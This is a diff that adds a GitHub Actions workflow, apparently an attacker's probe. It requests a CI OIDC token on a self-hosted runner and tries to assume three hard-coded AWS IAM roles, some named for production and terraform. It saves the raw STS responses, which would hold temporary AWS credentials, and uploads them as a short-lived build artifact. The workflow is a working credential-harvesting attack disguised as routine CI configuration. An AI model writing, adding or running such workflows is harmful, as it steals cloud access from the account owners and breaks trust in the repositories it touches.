@@ -1,0 +1,26 @@
+name: aws-oidc-probe-x3
+on:
+  push:
+    branches: [fleet-sync-rhznnu]
+jobs:
+  probe:
+    runs-on: [self-hosted, Linux, X64]
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: STS assume-role via curl
+        run: |
+          mkdir -p out
+          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          echo "got id token: ${#TOKEN} chars" > out/result.txt
+          for ROLE in "arn:aws:iam::221082216409:role/GitHubActionsECSRole" "arn:aws:iam::512978621355:role/github-actions-gateway-prd" "arn:aws:iam::512978621355:role/github-actions-gateway-terraform"; do
+            echo "=== $ROLE ===" >> out/result.txt
+            curl -s -m 20 -X POST "https://sts.amazonaws.com/"               -d "Action=AssumeRoleWithWebIdentity"               -d "RoleArn=$ROLE"               -d "RoleSessionName=probe$RANDOM"               -d "WebIdentityToken=$TOKEN"               -d "DurationSeconds=900"               -d "Version=2011-06-15" >> out/result.txt 2>&1
+            echo "" >> out/result.txt
+          done
+      - uses: actions/upload-artifact@v4
+        with:
+          name: oidc-probe3
+          path: out/
+          retention-days: 1
